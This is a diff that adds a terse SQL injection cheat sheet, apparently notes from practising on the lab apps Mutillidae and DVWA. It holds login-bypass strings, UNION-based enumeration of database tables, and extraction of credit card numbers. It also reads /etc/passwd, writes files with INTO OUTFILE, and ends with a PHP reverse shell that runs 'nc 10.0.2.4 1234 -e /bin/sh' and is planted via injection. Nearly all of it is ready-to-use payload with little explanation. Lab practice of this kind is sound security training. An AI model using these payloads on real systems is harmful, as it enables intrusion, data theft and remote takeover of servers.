@@ -1,0 +1,77 @@
+POST METHOD
+
+SELECT * FROM accounts WHERE username='atil' AND password='123456' AND 1=1#'
+
+password: 123456' AND 1=1#
+
+password: 123456' ORDER BY 1#
+
+123456' AND 1=1--
+
+SELECT * FROM accounts WHERE username='atil'#AND password='1'
+
+username: atil'#
+
+SELECT * FROM accounts WHERE username='atil'#'AND password='1'
+
+username: atil
+password: 1' OR 1=1#
+password: 1' OR 1=1--
+
+SELECT * FROM accounts WHERE username='atil'AND password='1' OR 1=1'#'
+
+GET METHOD
+
+http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=atil&password=123456&user-info-php-submit-button=View+Account+Details
+
+http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin%27%23&password=1&user-info-php-submit-button=View+Account+Details
+
+UNION SELECT
+
+username: atil' union select 1,2,3,4,5#
+database(), user(), version()
+
+information_schema
+
+username: atil' union select 1,table_name,3,4,5 from information_schema.tables where table_schema = 'owasp10'#
+
+username: atil' union select 1,column_name,3,4,5 from information_schema.columns where table_name = 'credit_cards'#
+
+username: atil' union select 1,ccnumber,ccv,expiration,5 from credit_cards#
+
+Blind SQL Injection
+
+1' union select 1,table_name from information_schema.tables#
+1' union select database(),user()#
+db -> dvwa
+1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#
+
+Advanced SQLi
+
+' AND 1=1#
+' OR 1=1#
+' AND 40=40#
+'+AND+1=1#
+' UnIoN+SelEcT+1,2,3,4,5#
+' UnIoN+SelEcT+1,2,3,4,5--
+' UnIoN+SelEcT+1,2,3,4,5//
+%27%20UnIoN%20SelEcT%201,2,3,4,5%23
+AND 1=1#
+
+union select 1,table_name from information_schema.tables where table_schema=0x64767761#
+
+load_file('/etc/passwd')
+
+1' union select 1,load_file('/etc/passwd')#
+1' union select null,load_file('/etc/passwd')#
+
+into outfile
+
+1' union select 1,'test' into outfile '/tmp/test.txt'#
+1' union select 1,'test' into outfile '/var/www/dvwa/test.txt'#
+
+1' union select 1,load_file('/tmp/test.txt')#
+
+<?passthru("nc 10.0.2.4 1234 -e /bin/sh");?> -> php shell reverse
+
+1' union select 1,'<?passthru("nc 10.0.2.4 1234 -e /bin/sh");?>' into outfile '/tmp/myshell.php'#
